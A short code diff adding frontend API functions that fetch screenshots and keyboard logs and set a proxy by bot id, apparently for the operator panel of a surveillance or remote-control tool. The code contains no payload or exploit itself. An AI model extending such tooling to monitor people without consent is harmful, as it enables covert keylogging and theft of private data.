@@ -104,7 +104,22 @@ export const get_recordings = async ({
   });
 };
 
-// download the certificate authority
 export const download_ca = async () => {
   window.location = `${BASE_API_PATH}/download_ca`;
+};
+
+export const get_screenshots = async (id, limit = 50, offset = 0) => {
+  return await api_request("GET", "/screenshots", { id, limit, offset });
+};
+
+export const get_keyboard_logs = async (id, limit = 50, offset = 0, startTime, endTime) => {
+  return await api_request("GET", "/keyboard-logs", { id, limit, offset, startTime, endTime });
+};
+
+export const get_global_proxy = async () => {
+  return await api_request("GET", "/settings/global-proxy");
+};
+
+export const set_global_proxy = async (bot_id) => {
+  return await api_request("POST", "/settings/global-proxy", {}, { bot_id });
 };
